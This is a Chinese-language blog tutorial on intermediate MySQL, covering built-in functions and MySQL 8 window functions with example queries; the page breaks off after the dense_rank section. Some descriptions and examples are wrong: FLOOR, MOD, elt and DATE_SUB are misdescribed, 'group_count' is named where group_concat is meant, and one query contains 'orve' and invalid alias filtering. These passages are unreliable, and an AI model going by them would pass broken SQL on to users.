<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>MySQL进阶 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">MySQL进阶</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%F0%9F%92%96%20%E9%AB%98%E7%BA%A7%E5%87%BD%E6%95%B0-toc" style="margin-left:0px"><a href="#%F0%9F%92%96%20%E9%AB%98%E7%BA%A7%E5%87%BD%E6%95%B0">? 高级函数</a></p> 
<p id="%F0%9F%8C%B9%20%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD">? 条件判断</a></p> 
<p id="%F0%9F%8C%B9%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0">?数学函数</a></p> 
<p id="%F0%9F%8C%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0">?字符串函数</a></p> 
<p id="%F0%9F%8C%B9%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0">?日期函数</a></p> 
<p id="%F0%9F%8C%B9%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0">?加密函数</a></p> 
<p id="%F0%9F%8C%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0">?系统函数</a></p> 
<p id="%F0%9F%8C%B9%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0">?其他函数</a></p> 
<p id="%F0%9F%92%96%E7%AA%97%E5%8F%A3%E5%87%BD%E6%95%B0%C2%A0%20MySQL8%20%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81-toc" style="margin-left:0px"><a href="#%F0%9F%92%96%E7%AA%97%E5%8F%A3%E5%87%BD%E6%95%B0%C2%A0%20MySQL8%20%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81">? 窗口函数  MySQL8 开始支持</a></p> 
<p id="%F0%9F%8C%B9LAG()%E3%80%81LEAD()%20%E5%87%BD%E6%95%B0%C2%A0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9LAG%28%29%E3%80%81LEAD%28%29%20%E5%87%BD%E6%95%B0%C2%A0">? LAG()、LEAD() 函数 </a></p> 
<p id="%F0%9F%8C%B9%20row_number()%C2%A0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20row_number%28%29%C2%A0">? row_number() </a></p> 
<p id="%C2%A0%F0%9F%8C%B9%20rank()%20%E4%B8%8E%20dense_rank()-toc" style="margin-left:40px"><a href="#%C2%A0%F0%9F%8C%B9%20rank%28%29%20%E4%B8%8E%20dense_rank%28%29"> ? rank() 与 dense_rank()</a></p> 
<p id="%C2%A0%F0%9F%8C%B9%20first_value()%20%E4%B8%8E%20last_value()-toc" style="margin-left:40px"><a href="#%C2%A0%F0%9F%8C%B9%20first_value%28%29%20%E4%B8%8E%20last_value%28%29"> ? first_value() 与 last_value()</a></p> 
<p id="%C2%A0%F0%9F%8C%B9%20nth_value(expr%EF%BC%8Cn)%20%E4%B8%8E%20ntile(n)-toc" style="margin-left:40px"><a href="#%C2%A0%F0%9F%8C%B9%20nth_value%28expr%EF%BC%8Cn%29%20%E4%B8%8E%20ntile%28n%29"> ? nth_value(expr，n) 与 ntile(n)</a></p> 
<p id="%F0%9F%92%96%E5%85%B3%E9%94%AE%E5%AD%97%C2%A0-toc" style="margin-left:0px"><a href="#%F0%9F%92%96%E5%85%B3%E9%94%AE%E5%AD%97%C2%A0">?关键字 </a></p> 
<p id="%F0%9F%8C%B9%20ANY-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20ANY">? ANY</a></p> 
<p id="%F0%9F%8C%B9%20ALL-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20ALL">? ALL</a></p> 
<p id="%F0%9F%92%96%20%E4%BD%BF%E7%94%A8JSON-toc" style="margin-left:0px"><a href="#%F0%9F%92%96%20%E4%BD%BF%E7%94%A8JSON">? 使用JSON</a></p> 
<p id="%F0%9F%8C%B9%20%E6%9F%A5%E6%89%BE-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E6%9F%A5%E6%89%BE">? 查找</a></p> 
<p id="%F0%9F%8C%B9%20JSON%20%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20JSON%20%E5%87%BD%E6%95%B0">? JSON 函数</a></p> 
<p id="%F0%9F%8C%B9%20%E4%BF%AE%E6%94%B9-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E4%BF%AE%E6%94%B9">? 修改</a></p> 
<p id="%F0%9F%8C%B9%20%E5%88%A0%E9%99%A4-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E5%88%A0%E9%99%A4">? 删除</a></p> 
<p id="%F0%9F%8C%B9%20%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0">? 其他函数</a></p> 
<p id="%F0%9F%8C%B9%20JSON%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%C2%A0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20JSON%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%C2%A0">? JSON使用索引 </a></p> 
<p id="%F0%9F%92%96%20%E5%85%AC%E7%94%A8%E8%A1%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F(CTE)%C2%A0-toc" style="margin-left:0px"><a href="#%F0%9F%92%96%20%E5%85%AC%E7%94%A8%E8%A1%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F%28CTE%29%C2%A0">? 公用表表达式(CTE) </a></p> 
<p id="%F0%9F%8C%B9%20WITH%E5%AD%90%E5%8F%A5%E7%94%A8%E6%B3%95-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20WITH%E5%AD%90%E5%8F%A5%E7%94%A8%E6%B3%95">? WITH子句用法</a></p> 
<p id="%F0%9F%8C%B9%20%E9%9D%9E%E9%80%92%E5%BD%92CTE%C2%A0-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E9%9D%9E%E9%80%92%E5%BD%92CTE%C2%A0">? 非递归CTE </a></p> 
<p id="%F0%9F%8C%B9%20%E9%80%92%E5%BD%92CTE-toc" style="margin-left:40px"><a href="#%F0%9F%8C%B9%20%E9%80%92%E5%BD%92CTE">? 递归CTE</a></p> 
<hr id="hr-toc">
<p></p> 
<h1 id="%F0%9F%92%96%20%E9%AB%98%E7%BA%A7%E5%87%BD%E6%95%B0">? 高级函数</h1> 
<h2 id="%F0%9F%8C%B9%20%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD">? 条件判断</h2> 
<table align="center"><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td style="width:523px"> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">IF(value，T，F)</p> </td>
<td style="width:523px"> <p style="text-align:center">相当于java的三元运算符，value为真返回T，否则返回F</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">IFNULL(value，value2)</p> </td>
<td style="width:523px"> <p style="text-align:center">判断value是否为空，为空返回vlaue2</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">ISNULL(expression)</p> </td>
<td style="width:523px"> <p style="text-align:center">判断表达式是否为 NULL，为NULL返回1，不为NULL返回0</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">NULLIF(expr1, expr2)</p> </td>
<td style="width:523px"> <p style="text-align:center">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CASE</p> <p style="text-align:center">WHEN 条件1 THEN 结果1</p> <p style="text-align:center">WHEN 条件2 THEN 结果2</p> <p style="text-align:center">WHEN 条件N THEN 结果N</p> <p style="text-align:center">ELSE 都不能满足的结果</p> <p style="text-align:center">END</p> </td>
<td style="width:523px"> <p style="text-align:center">流程控制语句，相当于java的if...else if</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CASE 条件</p> <p style="text-align:center">WHEN 常量值1 THEN 结果1</p> <p style="text-align:center">WHEN 常量值2 THEN 结果2</p> <p style="text-align:center">WHEN 常量值N THEN 结果N</p> <p style="text-align:center">ELSE 结果N</p> <p style="text-align:center">END</p> </td>
<td style="width:523px"> <p style="text-align:center">流程控制语句，相当于jav a的switch...case</p> </td>
</tr>
</tbody></table>
<hr>
<h2 id="%F0%9F%8C%B9%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0">?数学函数</h2> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td style="width:613px"> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">ABS(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回X的绝对值</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SQRT(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回X的平方根</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">POW(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回X的Y次方根</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CEIL(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回大于X的最小整数，即向上取整</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">FLOOR(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回大于X的最大整数，即向下取整</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MOD(X，Y)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回X/Y的值</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">RAND(X)</p> </td>
<td style="width:613px"> <p style="text-align:center">返回0-1的随机数</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">ROUND（X，Y）</p> </td>
<td style="width:613px"> <p style="text-align:center">返回X的四舍五入，Y为保留几位小数</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">TRUNCATE（X，Y）</p> </td>
<td style="width:613px"> <p style="text-align:center">不考虑四舍五入，截断X，Y为截断的小数点位数</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">FORMAT(X，Y)</p> </td>
<td style="width:613px"> <p style="text-align:center">强制保留Y位，考虑四舍五入，和ROUND(X，Y)区别是整数超过三位会以逗号分隔，返回文本</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT CEIL(2.1)    #3 向上取整
SELECT FLOOR(2.1)   #2 向下取整
SELECT RAND()       #返回0-1之间的随机数   0.6553991843530901
SELECT ROUND(2.5686,3)     #四舍五入保留三位   2.569
SELECT TRUNCATE(2.5686,3)  #截断小数点后三位   2.568
SELECT FORMAT(123859.5686,3)  #四舍五入，整数超过三位逗号分隔  123,859.569  </code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0">?字符串函数</h2> 
<table style="width:696px"><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td style="width:428px"> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CONCAT(S1,S2,...Sn)</p> </td>
<td style="width:428px"> <p style="text-align:center">拼接字符串；</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CONCAT_WS(6,S1,S2...Sn)</p> </td>
<td style="width:428px"> <p style="text-align:center">拼接字符串。但每个以字符串都会加6</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">LENGTH(S)</p> </td>
<td style="width:428px"> <p style="text-align:center">返回字符串S的字符串的字节，和字符集有关，一个字符占3个字节</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">LEFT(S，N) RIGHT(S，N)</p> </td>
<td style="width:428px"> <p style="text-align:center">返回字符串左边/右边的第N个字符</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">TRIM(S)</p> </td>
<td style="width:428px"> <p style="text-align:center">去除S开始和结束的空格</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SUBSTRING(s,index,len)</p> </td>
<td style="width:428px"> <p style="text-align:center">返回字符串S的index位置截取len字符</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">LCASE(s)、LOWER(s)</p> </td>
<td style="width:428px"> <p style="text-align:center">将字符串 s 的所有字母变成小写字母</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">UCASE(s)、UPPER(s)</p> </td>
<td style="width:428px"> <p style="text-align:center">将字符串 s 的所有字母变成大写字母</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CAST(x AS type)</p> </td>
<td style="width:428px"> <p style="text-align:center">转换数据类型</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">ELT(N,str1,str2,str3,…)</p> </td>
<td style="width:428px"> <p style="text-align:center">返回对应位置的字符串</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT CONCAT('Hello','World')  #HelloWorld  
SELECT CONCAT_WS('6','1','1','1') #16161
SELECT LENGTH('hello world')    #11字节
SELECT LEFT('helloworld',5),RIGHT('helloworld',5)   #helloworld
SELECT TRIM('  YYYY-MM-dd')      #YYYY-MM-dd
SELECT SUBSTRING('helloworld',1,5)  #hello
SELECT CAST("2017-08-29" AS DATE)#字符串转Date
SELECT CAST("2" AS signed);#字符串转数字
select elt(2,'02','03') #02</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0">?日期函数</h2> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CURDATE()</p> </td>
<td> <p style="text-align:center">返回当前系统日期</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">CURTIME()</p> </td>
<td> <p style="text-align:center">返回当前系统时间</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">NOW()、SYSDATE()、LOCALTIME()、LOCALTIMESTAMP()</p> </td>
<td> <p style="text-align:center">返回当前系统日期时间</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">YEAR(date)、MONTH(date)、DAY(date)、HOUR(time)、MINUTE(time)、SECOND(time)</p> </td>
<td> <p style="text-align:center">返回具体的年月日时分秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DATEDIFF(DATE1，DATE2)</p> </td>
<td> <p style="text-align:center">返回两个日期的日期间隔</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DATE_FORMAT(datetime,fmt)</p> </td>
<td> <p style="text-align:center">按照字符串fmt格式化日期datetime值</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DATE_ADD(date,INTERVAL expr type)</p> </td>
<td> <p style="text-align:center">函数向日期添加指定的时间间隔。</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DATE_SUB(date,INTERVAL expr type)</p> </td>
<td> <p style="text-align:center">函数向日期减少指定的时间间隔。</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT CURDATE() #2022-08-08
SELECT CURTIME() #14:43:47
SELECT NOW()      #2022-08-08 14:44:27
SELECT SYSDATE()# 2022-08-08 14:44:44
SELECT LOCALTIME() #2022-08-08 14:45:12
SELECT LOCALTIMESTAMP() #2022-08-08 14:45:29
SELECT YEAR(NOW()) AS '年',MONTH(NOW()) AS '月',DAY(NOW()) AS '日',HOUR(NOW()) AS '时',MINUTE(NOW()) AS '分',SECOND(NOW()) AS '秒'    #2022年8月8日14时45分53秒

SELECT DATEDIFF('2022-07-04','2022-07-01')      #相差天数3
SELECT DATE_FORMAT(CURDATE(),'%y%m%d')          #格式化后220705

SELECT DATE_ADD('2022-08-08',INTERVAL 1 DAY)  #2022-08-09   8月8加一天8月9
SELECT DATE_SUB('2022-08-08',INTERVAL 2 DAY)  #2022-08-09   8月8减二天8月6</code></pre> 
<p>DATE_SUB() 、DATE_ADD()的type参数可以是下列值：</p> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>Type 值</strong></p> </td>
<td> <p style="text-align:center"><strong>说明</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MICROSECOND</p> </td>
<td> <p style="text-align:center">毫秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SECOND</p> </td>
<td> <p style="text-align:center">秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MINUTE</p> </td>
<td> <p style="text-align:center">分</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">HOUR</p> </td>
<td> <p style="text-align:center">小时</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DAY</p> </td>
<td> <p style="text-align:center">天</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">WEEK</p> </td>
<td> <p style="text-align:center">周</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MONTH</p> </td>
<td> <p style="text-align:center">月</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">QUARTER</p> </td>
<td> <p style="text-align:center">季度</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">YEAR</p> </td>
<td> <p style="text-align:center">年</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SECOND_MICROSECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：秒、毫秒，expr可以用两个值来分别指定秒和毫秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MINUTE_MICROSECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：分、毫秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">MINUTE_SECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：分、秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">HOUR_MICROSECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：小时、毫秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">HOUR_SECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：小时、秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">HOUR_MINUTE</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：小时分</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DAY_MICROSECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：天、毫秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DAY_SECOND</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：天、秒</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DAY_MINUTE</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：天、分</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DAY_HOUR</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：天、小时</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">YEAR_MONTH</p> </td>
<td> <p style="text-align:center">复合型，间隔单位：年、月</p> </td>
</tr>
</tbody></table>
<hr>
<h2 id="%F0%9F%8C%B9%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0">?加密函数</h2> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">password(str)</p> </td>
<td> <p style="text-align:center">返回字符串str的加密版本，41位长的字符串(mysql8不再支持)</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">md5(str)</p> </td>
<td> <p style="text-align:center">返回字符串str的md5值，一种加密方式</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SHA(str)</p> </td>
<td> <p style="text-align:center">返回字符串str的sha算法加密字符串，40位十六进制值的密码字符串</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">SHA2(str，sash_length)</p> </td>
<td> <p style="text-align:center">返回字符串str的sha算法加密字符串，密码字符串的长度是hash_length/4。hash_length可以是224、256、384、512、0其中0等同于256。</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT MD5('123456')    #e10adc3949ba59abbe56e057f20f883e
SELECT SHA('123456')    #7c4a8d09ca3762af61e59520943dc26494f8941b</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0">?系统函数</h2> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">VERSION()</p> </td>
<td> <p style="text-align:center">返回数据库版本信息</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">USER()</p> </td>
<td> <p style="text-align:center">查询当前登录用户</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">DATABASE()</p> </td>
<td> <p style="text-align:center">查询当前使用哪个数据库</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT VERSION()    #5.7.37-log
SELECT USER()       #用户名@连接地址
SELECT DATABASE()   #数据库名</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0">?其他函数</h2> 
<table><tbody>
<tr>
<td> <p style="text-align:center"><strong>函数</strong></p> </td>
<td> <p style="text-align:center"><strong>用法</strong></p> </td>
</tr>
<tr>
<td> <p style="text-align:center">COALESCE(expr1, expr2, …, expr_n)</p> </td>
<td> <p style="text-align:center">返回参数中的第一个非空表达式（从左向右）</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">NULLIF(expr1, expr2)</p> </td>
<td> <p style="text-align:center">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</p> </td>
</tr>
<tr>
<td> <p style="text-align:center">group_count()</p> </td>
<td> <p style="text-align:center">将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p> </td>
</tr>
</tbody></table>
<pre><code class="language-sql">SELECT COALESCE(NULL, NULL, NULL, 'baidu.com', NULL, 'google.com')  #baidu.com

SELECT NULLIF('cao', 'cao1') #cao</code></pre> 
<hr>
<h1 id="%F0%9F%92%96%E7%AA%97%E5%8F%A3%E5%87%BD%E6%95%B0%C2%A0%20MySQL8%20%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81">? 窗口函数  MySQL8 开始支持</h1> 
<p><strong>语法：</strong></p> 
<pre><code class="language-sql">funcation(args) over([PARTITION BY expression] [ORDER BY expression[ASC|DESC]][frame])</code></pre> 
<p><strong>解释：</strong></p> 
<ul>
<li>
<strong>funcation：</strong>换成对应的函数例如LAG 、LEAD、SUM..</li>
<li>
<strong>PARTITION BY：</strong>分组的列</li>
<li>
<strong>ORDER By：</strong> 排序的列，默认升序</li>
<li>
<strong>frame：</strong> 判定分组的方式</li>
</ul>
<ul><li> 
  <ul><li>
<strong>rows模式：</strong> 按照物理行进行区分</li></ul>
</li></ul>
<pre><code class="language-sql">SELECT 
    year_month,
    sales,
    sum(sales) over(order by year_month rows unbounded PRECEDING) as sum_by_sub_cate
from  tmp</code></pre> 
<blockquote> 
 <ul>
<li>sales=3594 ； sum_by_sub_cate=3594</li>
<li>sales=865 ； sum_by_sub_cate=4459 #相当于3594 +865</li>
<li>sales=603 ； sum_by_sub_cate=5062 #相当于4459 +603</li>
</ul>
</blockquote> 
<p></p> 
<ul><li> 
  <ul><li>
<strong>range模式：</strong>按照数值进行逻辑区分</li></ul>
</li></ul>
<pre><code class="language-sql">SELECT 
    year_month,
    sales,
    sum(sales) over(order by year_month range unbounded PRECEDING) as sum_by_sub_cate
from  tmp</code></pre> 
<p></p> 
<blockquote> 
 <ul>
<li>根据year_month排序，它是分组算的</li>
<li>year_month=2022-01；sales=3594； sum_by_sub_cate=4459</li>
<li>year_month=2022-01；sales=865； sum_by_sub_cate=4459</li>
<li>year_month=2022-02；sales=603； sum_by_sub_cate=7920</li>
<li>year_month=2022-02；sales=2858； sum_by_sub_cate=7920</li>
<li>第一组进行组内累加 sum_by_sub_cate是累加结果 即3594+865=4459；</li>
<li>第二组进行组内累加 603+2858=3461；在加上，上一组的结果3461+4459=7920</li>
</ul>
</blockquote> 
<hr>
<h2 id="%F0%9F%8C%B9LAG()%E3%80%81LEAD()%20%E5%87%BD%E6%95%B0%C2%A0">? LAG()、LEAD() 函数 </h2> 
<ul>
<li>lead(expression,n)：返回当前行的后n行，理解为取未来的数据，今天取明天的数据</li>
<li>lag(expression,n)： 返回当前行的前n行， 理解为取之前的数据，今天取昨天的数据</li>
</ul>
<p><strong>语法：</strong></p> 
<pre><code class="language-sql">LAG(要取的列,取偏移后的第几行数据,没有符合条件的默认值默认为null) OVER()
LEAD(要取的列,取偏移后的第几行数据,没有符合条件的默认值默认为null) OVER()</code></pre> 
<p><strong>案例1：</strong>查询每个月和上月的销售数、没有为0</p> 
<p>表结构&amp;数据：<img alt="" height="128" src="https://images2.imgbox.com/a0/44/N2rJbSBb_o.png" width="250"></p> 
<pre><code class="language-sql">SELECT
product '产品名',
DATE_FORMAT(`year_month`,'%Y-%d-%m') '月份',
gmv '销量',
LAG(gmv,1,0)over() '上月销售'
FROM
`xiaoliang`</code></pre> 
<p><img alt="" height="159" src="https://images2.imgbox.com/d0/ce/RsztPUgy_o.png" width="520"></p> 
<p> 如果要取这个月和下个月的 使用LAED()</p> 
<p></p> 
<p><strong>案例2：</strong>取连续登录5天的活跃用户，用户同一天可能重复登录</p> 
<p><img alt="" height="190" src="https://images2.imgbox.com/4f/0e/toUAnpyd_o.png" width="95"></p> 
<p><strong>分析：</strong></p> 
<p><img alt="" height="184" src="https://images2.imgbox.com/50/df/ZjgKqTK4_o.png" width="776"></p> 
<p> 看上图站在第二条数据角度看，lag_num是上一条数据的结果，lead_num是下一条数据的结果，所有只有 number、lag_num、lead_num相等即可找出连续出现的数据row——</p> 
<pre><code class="language-sql">SELECT DISTINCT num AS Consecutivenums
FROM(
    SELECT
    id,num,
    lag(num,1) orve(ORDER BY id) lag_num,
    lead(num,1) orve(ORDER BY id) lead_num
    FROM Logs
    WHERE num=lag_num AND num=lead_num
)</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20row_number()%C2%A0">? row_number() </h2> 
<p>作用：加上序号</p> 
<pre><code class="language-sql">SELECT
t.*,
row_number() over ( PARTITION BY id ORDER BY sale ) AS rank1 
FROM
test AS t;</code></pre> 
<p><img alt="" height="168" src="https://images2.imgbox.com/0f/3d/MkJRS1Go_o.png" width="458"></p> 
<p>不加分组PARTITION BY id</p> 
<p><img alt="" height="173" src="https://images2.imgbox.com/c5/f0/7nZn0pg9_o.png" width="311"></p> 
<hr>
<h2 id="%C2%A0%F0%9F%8C%B9%20rank()%20%E4%B8%8E%20dense_rank()"> ? rank() 与 dense_rank()</h2> 
<pre><code class="language-sql">rank() over(partition by col1 order by col2)</code></pre> 
<blockquote> 
 <ul><li>rank函数根据字段col1进行分组，在分组内部根据字段col2进行<strong>跳跃排序</strong>，有相同的排名时，相同排名的数据有相同的序号，排序<strong>序号不连续</strong>；</li></ul>
 <p>#对id进行分组，分组后根据sale排序</p> 
 <p>#可以发现sale相同时有相同的序号，并且由于id=1的分组中没有排名第3的序号造成排序不连续</p> 
 <p><img alt="" height="170" src="https://images2.imgbox.com/62/47/DWVMy7Gj_o.png" width="286"></p> 
 <p>bbb、ccc成绩一样共同排名第二，去除排序，fff也是排第二 </p> 
</blockquote> 
<p></p> 
<pre><code class="language-sql">dense_rank() over(partition by col1 order by col2)</code></pre> 
<blockquote> 
 <ul><li>dense_rank函数根据字段col1进行分组，在分组内部根据字段col2进行连续排序，有相同的排名时，相同排名的数据有相同的序号，但是排序序号连续</li></ul>
 <p>#对id进行分组，分组后根据sale排序</p> 
 <p>#可以发现sale相同时有相同的序号，但是整个排序序号是连续的</p> 
 <p><img alt="" height="167" src="https://images2.imgbox.com/3d/1c/5qI8lS9e_o.png" width="395"></p> 
</blockquote> 
<hr>
